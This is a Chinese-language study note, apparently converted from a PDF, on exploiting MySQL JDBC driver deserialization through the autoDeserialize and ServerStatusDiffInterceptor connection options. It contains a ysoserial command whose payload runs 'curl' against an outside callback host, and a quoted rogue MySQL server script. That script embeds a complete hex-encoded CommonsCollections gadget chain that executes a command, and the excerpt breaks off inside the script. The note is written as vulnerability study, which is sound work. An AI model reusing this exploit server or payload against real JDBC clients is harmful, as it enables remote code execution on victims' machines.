1
JDBC反序列化⼊⻔学习
JDBC？
测试环境
建⽴JDBC连接
反序列化简单介绍
断点调试
构造POC
show session status响应包
Exp
补充
资料（原⽂）
不复制粘贴了,⻅JDBC基础介绍
IDEA
Mysql 5.7
https://www.runoob.com/java/java-mysql-connect.html
学习来源 https://xz.aliyun.com/t/8159
JDBC？
1 Java Database Connectivity
测试环境
建⽴JDBC连接
2
下载驱动包
https://dev.mysql.com/downloads/connector/j/
不要下最新的，估摸着是修了。下载8.0.12
多下⼏个版本
3
右键引⼊作为module库，就跑起来了。
漫谈Java反序列化
 https://github.com/SummerSec/JavaLearnVulnerability
每个版本在反序列化利⽤的时候有⼀定区别。
反序列化简单介绍
4
以及落⽊萧萧的article
跟着⽂章学习
com.mysql.cj.jdbc.Driver的触发点是
要触发需要在连接字符串中加上
打断点
1 反序列化漏洞三要素实现Serializabe接⼝、readObject()、writeObject()⽅法，
缺⼀不可。
2
3 漏洞挖掘或许就是怎么找到可控点，达到rce的⽬的。
断点调试
1 com.mysql.cj.jdbc.result.ResultSetImpl.getObject()
1 queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffI
nterceptor&autoDeserialize=true
5
如果是⼆进制数据就会往下⾛，到readObject处触发反序列化。
6
这个⽅法在
com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithS
essionStatusValues()  处调⽤。
对⽐其他⼈的漏洞分析⽂章发现，我的这个版本在这⾥没有了对结果处理的函数
调⽤点
7
根据执⾏ SHOW SESSION STATUS 这条语句之后要在服务端返回⼀个恶意的⼆进制对象，所以重点就是
怎么构造这个对象，有时候漏洞存在的情况仍然攻击不成功，有可能是因为各个版本的mysql发包不⼀样，
需要抓包定制化攻击。
Mac下抓包测试
第⼀个是Response Ok
构造POC
1 tcp.port ==3306 && mysql
8
数据包内容为
重点是这个响应包
结果集响应包的结构
1 0700000200000002000000
show session status响应包
9
数据段1：说明下⾯的结果集有多少列
数据段2：列的定义
数据段3： EOF 包
数据段4：⾏数据。
结果集数据包如图
10
整个数据包如下
1  01 数据⻓度为1 00  00 01 sequence id为1 02 代表有两列
11
第三部分是EOF，⽂章作者说加上就会报错。我在问熟悉这个漏洞的朋友。
第四部分就是⾃⼰的poc
使⽤yso⽣成即可。
yso的链⽬前不懂。
补充截图
问候报⽂
1  java -jar wingyso.jar CommonsCollections7 "curl 5s3g.hyuga.co" > 
data
12
所有的response需要对应上。
作者的poc
  1 # -*- coding:utf-8 -*-
  2 #@Time : 2020/7/27 2:10
  3 #@Author: Tri0mphe7
  4 #@File : server.py
  5 import socket
  6 import binascii
  7 import os
  8
  9 greeting_data="4a0000000a352e372e31390008000000463b452623342c2d0
0fff7080200ff811500000000000000000000032851553e5c23502c51366a006
d7973716c5f6e61746976655f70617373776f726400"
 10 response_ok_data="0700000200000002000000"
13
 11
 12 def receive_data(conn):
 13     data = conn.recv(1024)
 14     print("[*] Receiveing the package : {}".format(data))
 15     return str(data).lower()
 16
 17 def send_data(conn,data):
 18     print("[*] Sending the package : {}".format(data))
 19     conn.send(binascii.a2b_hex(data))
 20
 21 def get_payload_content():
 22     //file⽂件的内容使⽤ysoserial⽣成的 使⽤规则  java -jar ysoserial 
[common7那个]  "calc" > a 
 23     file= r'a'
 24     if os.path.isfile(file):
 25         with open(file, 'rb') as f:
 26             payload_content = str(binascii.b2a_hex(f.read()),enc
oding='utf-8')
 27         print("open successs")
 28
 29     else:
 30         print("open false")
 31         #calc
 32         payload_content='aced0005737200116a6176612e7574696c2e486
17368536574ba44859596b8b7340300007870770c000000023f4000000000000
1737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696
f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fd
b0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c0
0036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f737
2002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e7
32e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f7
27974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c6563746
96f6e732f5472616e73666f726d65723b78707372003a6f72672e61706163686
52e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436
861696e65645472616e73666f726d657230c797ec287a97040200015b000d695
472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6
f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b787075720
02d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6
e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057
372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6
14
e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587
690114102b1940200014c000969436f6e7374616e7471007e000378707672001
16a6176612e6c616e672e52756e74696d6500000000000000000000007870737
2003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e7
32e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6
b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f6
26a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e6
72f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612
f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626
a6563743b90ce589f1073296c02000078700000000274000a67657452756e746
96d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a9
90200007870000000007400096765744d6574686f647571007e001b000000027
67200106a6176612e6c616e672e537472696e67a0f0a4387a3bb342020000787
07671007e001b7371007e00137571007e001800000002707571007e001800000
000740006696e766f6b657571007e001b00000002767200106a6176612e6c616
e672e4f626a656374000000000000000000000078707671007e00187371007e0
013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4
702000078700000000174000463616c63740004657865637571007e001b00000
00171007e00207371007e000f737200116a6176612e6c616e672e496e7465676
57212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616
e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a617
6612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f616
4466163746f724900097468726573686f6c6478703f400000000000007708000
0001000000000787878'
 33     return payload_content
 34
 35 # 主要逻辑
 36 def run():